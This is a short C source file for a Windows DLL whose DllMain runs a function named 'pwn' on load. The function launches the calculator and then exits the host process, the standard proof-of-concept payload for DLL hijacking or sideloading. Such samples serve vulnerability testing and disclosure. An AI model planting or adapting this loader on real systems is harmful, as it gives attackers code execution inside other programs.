#include <windows.h>
 
int pwn()
{
	  WinExec("calc", 0);
	    exit(0);
	      return 0;
}
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
	  pwn();
	    return 0;
}
